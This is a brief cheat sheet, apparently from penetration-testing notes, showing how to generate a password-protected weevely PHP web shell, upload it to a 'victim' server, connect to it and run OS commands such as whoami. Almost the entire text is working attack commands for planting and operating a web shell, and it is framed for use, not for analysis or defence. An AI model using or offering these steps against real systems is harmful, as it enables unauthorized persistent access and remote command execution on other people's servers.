Quick webshell creation and usage
----------------------------------
```bash
# create web shell
# weevely generate <password> ./<outputfile.php>

weevely generate 1234 ./weevley.php

### upload file to victim

# get webshell
# weevely http://xxx.xxx.xxx.xxx/<outputfile.php> <password>

weevely http://xxx.xxx.xxx.xxx/weevley.php 1234
# **type ":help" for more commands**
# use ctrl-c to exit

# run single command
# weevely http://xxx.xxx.xxx.xxx/<outputfile.php> <password> <os-command>

weevely http://xxx.xxx.xxx.xxx/weevley.php 1234 whoami
```
